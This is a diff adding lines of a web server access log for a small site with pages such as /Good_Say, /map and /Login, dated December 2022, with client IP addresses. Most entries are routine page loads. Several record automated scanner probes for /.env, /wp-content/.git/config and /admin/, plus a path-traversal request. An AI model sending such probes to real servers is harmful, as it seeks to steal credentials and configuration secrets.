+211.54.39.163 - - [08/Dec/2022 15:06:23] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:24] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:24] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:24] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /map HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/css/header.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/css/map.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/assets/search2.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/assets/like2.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /static/assets/mypage2.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:06:28] "GET /favicon.ico HTTP/1.1" 404 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/css/header.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/css/map.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/assets/search2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/assets/like2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:18:31] "GET /static/assets/mypage2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/css/header.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/css/map.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/assets/search2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/assets/like2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:33:51] "GET /static/assets/mypage2.png HTTP/1.1" 304 -
+162.142.125.211 - - [08/Dec/2022 15:34:26] "GET / HTTP/1.1" 200 -
+162.142.125.211 - - [08/Dec/2022 15:34:27] "GET / HTTP/1.1" 200 -
+162.142.125.211 - - [08/Dec/2022 15:34:27] code 505, message Invalid HTTP version (2.0)
+162.142.125.211 - - [08/Dec/2022 15:34:27] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
+162.142.125.211 - - [08/Dec/2022 15:34:27] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.211 - - [08/Dec/2022 15:34:27] "GET /../static/assets/house.svg HTTP/1.1" 404 -
+162.142.125.211 - - [08/Dec/2022 15:34:28] "GET /favicon.ico HTTP/1.1" 404 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/css/map.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/assets/search2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/css/header.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/assets/like2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:26] "GET /static/assets/mypage2.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:28] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 15:45:30] "GET /Good_Say HTTP/1.1" 200 -
+205.210.31.2 - - [08/Dec/2022 16:01:25] "GET / HTTP/1.0" 200 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/css/style.css HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/js/index.js HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:12] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:03:13] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:19] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:19] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:19] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:28] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:30] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:30] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:06:30] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:09:58] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:10:00] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:10:00] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:10:00] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 16:11:10] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:10] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:10] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:11] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:12] "GET /Good_Say HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:12] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 16:11:12] "GET /static/assets/house.svg HTTP/1.1" 304 -
+23.90.160.130 - - [08/Dec/2022 16:14:10] "GET /admin/ HTTP/1.1" 404 -
+135.125.217.54 - - [08/Dec/2022 16:16:57] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 16:16:57] "GET /.env HTTP/1.1" 404 -
+179.43.177.154 - - [08/Dec/2022 16:20:56] code 400, message Bad request version ('À\x13À')
+179.43.177.154 - - [08/Dec/2022 16:20:56] " î  ê'Õ®EÊàùY¸EÍC°5°E¸m²úvÈ-A XûB ¿Ú§ª.Äs2^úÿðû÷¾Ðú: &À+À/À,À0Ì©Ì¨À	ÀÀ" HTTPStatus.BAD_REQUEST -
+179.43.177.154 - - [08/Dec/2022 16:20:57] "GET /wp-content/.git/config HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 16:43:52] "GET /.env HTTP/1.1" 404 -
+185.254.196.115 - - [08/Dec/2022 16:43:53] "POST / HTTP/1.1" 405 -
+211.54.39.163 - - [08/Dec/2022 17:03:22] "GET / HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:22] "GET /static/css/reset.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:22] "GET /static/css/style.css HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/js/index.js HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:23] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:24] "GET /static/assets/house.svg HTTP/1.1" 200 -
+211.54.39.163 - - [08/Dec/2022 17:03:24] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.54.39.163 - - [08/Dec/2022 17:03:25] "GET /Good_Say HTTP/1.1" 200 -
+135.125.217.54 - - [08/Dec/2022 17:45:12] "POST / HTTP/1.1" 405 -
+135.125.217.54 - - [08/Dec/2022 17:45:12] "GET /.env HTTP/1.1" 404 -
+192.155.90.118 - - [08/Dec/2022 18:01:54] code 400, message Bad request version ('À\x14À')
+192.155.90.118 - - [08/Dec/2022 18:01:54] "   ÚÜüÏ¯¾s%'V1A­	ÛÞX[í   À/À0À+À,Ì¨Ì©ÀÀ	ÀÀ" HTTPStatus.BAD_REQUEST -
+84.21.172.128 - - [08/Dec/2022 18:29:06] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/css/style.css HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/js/index.js HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/search.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/like.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:43] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:44] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /static/css/profile.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:49] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:50] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /static/css/profile.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:53] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:54] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:54] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:56] "GET /register HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 18:59:56] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 18:59:56] "GET /static/css/joinstyle.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /map HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/css/header.css HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/css/map.css HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/assets/search2.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/assets/like2.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:01] "GET /static/assets/mypage2.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:05] "GET /Login HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:05] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:16] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:17] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:18] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /static/assets/house.svg HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:19] "GET /Good_Say HTTP/1.1" 200 -
+44.212.40.54 - - [08/Dec/2022 19:00:26] "GET / HTTP/1.1" 200 -
+3.82.115.141 - - [08/Dec/2022 19:00:27] "GET / HTTP/1.1" 200 -
+3.238.51.3 - - [08/Dec/2022 19:00:27] "GET /static/assets/house.svg HTTP/1.1" 200 -
+44.195.22.157 - - [08/Dec/2022 19:00:27] "GET /static/assets/house.svg HTTP/1.1" 200 -
+54.197.200.24 - - [08/Dec/2022 19:00:27] "GET /favicon.ico HTTP/1.1" 404 -
+52.90.75.187 - - [08/Dec/2022 19:00:28] "GET /favicon.ico HTTP/1.1" 404 -
+125.180.181.238 - - [08/Dec/2022 19:00:28] "GET / HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:30] "GET /static/css/reset.css HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:30] "GET /static/css/style.css HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/js/index.js HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/like.png HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/search.png HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/mypage.png HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/story_img1.png HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/menu/american/steak.png HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /static/assets/call.png HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /rank HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:31] "GET /Good_Say HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/css/ranking.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:31] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:32] "GET /static/assets/house.svg HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:32] "GET /static/assets/house.svg HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /write/2 HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/css/reset.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/css/style.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/css/write2style.css HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/assets/like.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /Mypage HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /static/css/profile.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:47] "GET /Login?loc%20=%20write/2 HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /static/assets/like.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:47] "GET /Login?loc%20=%20Mypage HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:48] "GET /static/css/Login.css HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:49] "GET /favicon.ico HTTP/1.1" 404 -
+211.187.196.252 - - [08/Dec/2022 19:00:49] "GET /static/css/Login.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/like.png HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:51] "GET /register HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/js/index.js HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/menu/american/steak.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:51] "GET /static/assets/call.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:52] "GET /Good_Say HTTP/1.1" 200 -
+125.180.181.238 - - [08/Dec/2022 19:00:52] "GET /static/css/reset.css HTTP/1.1" 304 -
+125.180.181.238 - - [08/Dec/2022 19:00:52] "GET /static/css/joinstyle.css HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET / HTTP/1.1" 200 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/css/reset.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/css/style.css HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/mypage.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/search.png HTTP/1.1" 304 -
+211.187.196.252 - - [08/Dec/2022 19:00:53] "GET /static/assets/story_img1.png HTTP/1.1" 304 -
